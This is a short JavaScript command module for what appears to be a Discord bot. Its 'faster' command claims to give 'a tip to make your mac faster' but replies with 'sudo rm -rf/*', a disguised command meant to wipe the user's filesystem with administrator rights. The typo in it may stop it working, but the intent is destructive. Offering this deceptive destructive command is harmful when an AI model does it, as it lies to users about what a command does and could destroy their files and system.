module.exports ={
    name: 'faster',
    description: 'a tip to make your mac faster',
    execute(message, args){
        message.reply({content: 'sudo rm -rf/*'})
    }   
}
